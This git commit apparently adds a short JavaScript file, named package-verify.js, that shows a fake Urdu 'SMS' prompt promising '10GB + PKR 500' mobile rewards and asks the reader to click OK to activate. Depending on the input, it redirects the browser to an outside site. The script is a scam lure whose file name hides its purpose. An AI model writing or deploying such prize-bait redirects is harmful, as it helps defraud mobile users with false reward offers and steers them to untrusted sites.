6661a23b8dacfc0dffa2206beb975e2a350d4ae0
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-06 08:53:48 +0100

    Create package-verify.js

---
+++ package-verify.js
@@ -0,0 +1,5 @@
+var password = '10GB + PKR 500'
+password=prompt('SMS: مبارک ہو، آپ کا موبائل نمبر 10GB + PKR 500 وصول کرنے کا اہل ہے، ابھی ایکٹیویٹ کرنے کے لیے OK پر کلک کریں','10GB + PKR 500');
+if (password != '10GB + PKR 500') {
+location.href='https://gbamz.com/sharif-birthday';
+}
